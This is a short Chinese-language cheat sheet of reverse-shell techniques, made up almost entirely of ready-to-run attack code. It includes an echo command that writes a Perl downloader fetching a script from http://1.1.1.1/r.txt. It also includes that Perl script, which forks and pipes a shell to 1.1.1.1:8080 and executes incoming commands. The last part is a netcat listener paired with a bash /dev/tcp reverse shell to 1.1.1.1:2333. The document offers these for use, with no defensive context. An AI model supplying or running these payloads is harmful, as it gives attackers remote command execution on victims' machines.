0、perl反弹shell  
用于生成下载脚本的bash命令：
```
echo use LWP::Simple\;\$url=\"http://1.1.1.1/r.txt\"\;\$coont=get\(\$url\)\;die \"not found link..\" if\(\!defined\(\$coont\)\)\;open \$file,\"\>r.pl\" or die \"couldn\'t open t.txt ..\\n\"\;print \$file \$coont\;close\(\$file\)\;exit\;>d.pl
```
执行后生成d.pl，再执行d.pl下载r.pl，r.pl（用于反连的perl脚本）如下：
```
use IO::Socket::INET;$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"1.1.1.1:8080");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~/(.*)/){system $1;}};
```

1、bash反弹shell  
attack执行：nc -lvp 2333  
victim执行：
```
bash -i >& /dev/tcp/1.1.1.1/2333 0>&1
```
